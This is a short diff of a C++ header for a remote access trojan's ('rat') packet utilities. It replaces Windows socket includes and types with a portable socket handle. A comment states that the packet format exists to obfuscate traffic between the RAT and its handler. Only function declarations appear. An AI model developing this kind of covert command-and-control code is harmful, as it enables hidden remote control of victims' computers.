@@ -1,18 +1,7 @@
 #ifndef RAT_SIGNAL
 #define RAT_SIGNAL
 
-#include <iostream>
-#include <string>
-#include <cstring>
-#include <iomanip>
-#include <sstream>
-#include <vector>
-#include <chrono>
-#include <utility>
-#include <thread>
-
-#include <winsock2.h>
-#include <ws2tcpip.h>
+#include <socketserver.hpp>
 
 // custom packet send across a socket to obfuscate
 // communication between rat and handler
@@ -60,10 +49,10 @@ namespace RatPacketUtils {
     std::string FromHex(const std::string& hex);
     std::string FormatHex(const std::string& input);
 
-    bool Send(const SOCKET& sock, const RatPacket& packet);
-    std::pair<RatPacket,bool> Recv(const SOCKET& sock);
-    bool Ack(const SOCKET& sock);
-    bool SendAck(const SOCKET& sock);
+    bool Send(const SocketHandle& sock, const RatPacket& packet);
+    std::pair<RatPacket,bool> Recv(const SocketHandle& sock);
+    bool Ack(const SocketHandle& sock);
+    bool SendAck(const SocketHandle& sock);
 };
 
 #endif
